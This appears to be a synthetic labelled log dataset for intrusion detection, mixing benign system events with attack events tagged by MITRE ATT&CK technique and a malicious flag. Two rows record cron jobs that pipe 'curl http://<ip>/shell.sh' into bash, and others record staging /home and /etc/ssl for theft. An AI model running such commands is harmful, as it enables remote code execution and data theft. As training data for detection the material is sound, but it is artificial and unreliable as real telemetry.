+2023-10-14 14:47:59,192.168.1.45,developer,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 14:48:44,45.154.255.88,root,kernel,PROCESS,CRITICAL,Suspicious process spawn: /tmp/.hidden_exploit executed with root UID,T1059.004,Execution,1
+2023-10-14 14:50:35,127.0.0.1,svc_backup,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 14:52:24,104.22.15.9,root,crontab,AUDIT,CRITICAL,New cron job added for user root: '* * * * * curl http://104.22.15.9/shell.sh | bash',T1053.003,Persistence,1
+2023-10-14 14:53:43,192.168.1.15,root,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 14:54:21,127.0.0.1,root,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 14:55:58,185.220.101.5,unknown,tar,PROCESS,WARNING,Archive creation of sensitive directory: tar -czf /tmp/backup.tar.gz /home /etc/ssl,T1560,Exfiltration_Staging,1
+2023-10-14 14:57:23,10.0.0.12,root,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 14:58:55,104.22.15.9,unknown,systemd,SYSTEM,CRITICAL,SYSTEM SHUTDOWN INITIATED by UID 0 (Anti-forensics evasion),T1529,Anti_Forensics,1
+2023-10-14 14:59:02,10.0.0.12,jdoe,postgres,DATABASE,INFO,Database connection established from 10.0.0.12:5432,T0000,Benign,0
+2023-10-14 14:59:59,192.168.1.15,bkumar,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 15:01:10,194.26.29.112,root,crontab,AUDIT,CRITICAL,New cron job added for user root: '* * * * * curl http://194.26.29.112/shell.sh | bash',T1053.003,Persistence,1
+2023-10-14 15:02:03,127.0.0.1,bkumar,sshd,AUTH,INFO,Accepted publickey for user 'bkumar' from 127.0.0.1 port 43892 ssh2,T0000,Benign,0
+2023-10-14 15:02:53,192.168.1.102,svc_backup,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 15:03:22,192.168.1.102,developer,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'developer' by (uid=0),T0000,Benign,0
+2023-10-14 15:05:05,10.0.0.12,svc_backup,systemd-logind,AUTH,INFO,New session c591 of user 'svc_backup'.,T0000,Benign,0
+2023-10-14 15:05:54,192.168.1.102,svc_backup,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 15:07:12,192.168.1.102,bkumar,postgres,DATABASE,INFO,Database connection established from 192.168.1.102:5432,T0000,Benign,0
+2023-10-14 15:07:35,192.168.1.15,svc_backup,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'svc_backup' by (uid=0),T0000,Benign,0
+2023-10-14 15:09:03,185.220.101.5,unknown,tar,PROCESS,WARNING,Archive creation of sensitive directory: tar -czf /tmp/backup.tar.gz /home /etc/ssl,T1560,Exfiltration_Staging,1
+2023-10-14 15:10:53,192.168.1.102,svc_backup,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 15:12:16,192.168.1.15,jdoe,systemd-logind,AUTH,INFO,New session c643 of user 'jdoe'.,T0000,Benign,0
+2023-10-14 15:12:49,10.0.0.12,admin,systemd,DAEMON,INFO,Service 'postgresql' started successfully.,T0000,Benign,0
+2023-10-14 15:13:54,104.22.15.9,unknown,sshd,AUTH,WARNING,Failed password for invalid user 'oracle' from 104.22.15.9 port 40350 ssh2,T1110.001,Brute_Force,1
+2023-10-14 15:14:51,192.168.1.45,bkumar,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 15:15:37,192.168.1.15,root,systemd,DAEMON,INFO,Service 'ufw' started successfully.,T0000,Benign,0
